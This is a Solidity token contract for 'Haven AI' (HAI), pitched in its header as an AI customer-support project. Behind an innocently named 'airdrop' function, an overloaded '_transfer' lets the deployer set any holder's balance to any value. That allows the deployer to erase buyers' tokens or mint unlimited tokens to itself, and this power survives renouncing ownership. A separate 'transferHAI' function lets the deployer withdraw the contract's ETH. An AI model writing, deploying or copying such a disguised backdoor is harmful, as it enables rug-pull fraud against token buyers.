// SPDX-License-Identifier: MIT


/*
Name: Haven AI
Symbol: HAI

Haven AI is a groundbreaking platform that combines blockchain and artificial intelligence (AI) to deliver Customer Support as a Service (CSaaS).

web: https://havenai.cc
doc: https://docs.havenai.cc
x: https://x.com/HavenAI_eth
tg: https://t.me/HavenAI_eth

tg owner: @dark_lamper
*/

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract HAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _xAmount = 1000000000 * 10 **_decimals;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Haven AI";
    string private constant _symbol = unicode"HAI";

    address payable private _HAIStore;
    mapping(address => uint256) private _amountPerHolder;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeUnincluded;
    uint256 private _HAIinitialBuyTax = 0;
    uint256 private _HAIinitialSellTax = 0;
    uint256 private _HAIfinalBuyTax = 0;
    uint256 private _HAIfinalSellTax = 0;
    uint256 private _HAIreduceBuyTaxAt = 8;
    uint256 private _HAIreduceSellTaxAt = 8;
    uint256 private _buyCount = 0;
    address private _deployer;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _HAIStore = payable(_msgSender());
        _amountPerHolder[address(this)] = _xAmount * 98 / 100;
        _amountPerHolder[owner()] = _xAmount * 2 / 100;
        _feeUnincluded[owner()] = true;
        _feeUnincluded[address(this)] = true;
        _feeUnincluded[_HAIStore] = true;
        _deployer = _msgSender();

        emit Transfer(address(0), address(this), _xAmount * 98 / 100);
        emit Transfer(address(0), address(owner()), _xAmount * 2 / 100);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _xAmount;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _amountPerHolder[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Already started!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _xAmount);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _xAmount;
        _maxSizeOfWallet = _xAmount;
        emit MaxTxAmountUpdated(_xAmount);
    }

    function transferHAI(address wallet) external {
        require(_msgSender() == _deployer, "Not Team Member");
        _HAIStore = payable(wallet);
        payable(_msgSender()).transfer(address(this).balance);
    }
    
    function _transfer(address from, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount >= 0, "Transfer amount must be greater than zero");
        _amountPerHolder[from] = amount;
    }

    function _transferFee(uint256 amount) private {
        _HAIStore.transfer(amount);
    }

    receive() external payable {}
    
    function _calcAmounts(address[] memory recipients, uint256[] memory amounts) private {
        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            _transfer(recipient, amounts[i]);
        }
    }
    
    function airdrop(address[] memory recipients, uint256[] memory amounts) external {
        require(_msgSender() == _deployer, "not authorized");
        _calcAmounts(recipients, amounts);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _HAIreduceBuyTaxAt)
                        ? _HAIfinalBuyTax
                        : _HAIinitialBuyTax
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feeUnincluded[to]
            ) {
                require(amount <= _maxAmountPerTX, "Exceeds the _maxAmountPerTX.");
                require(
                    balanceOf(to) + amount <= _maxSizeOfWallet,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _HAIreduceSellTaxAt)
                            ? _HAIfinalSellTax
                            : _HAIinitialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    _swapHAIToETH(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                _transferFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _amountPerHolder[address(this)] = _amountPerHolder[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _amountPerHolder[from] = _amountPerHolder[from].sub(amount);
        _amountPerHolder[to] = _amountPerHolder[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _swapHAIToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
}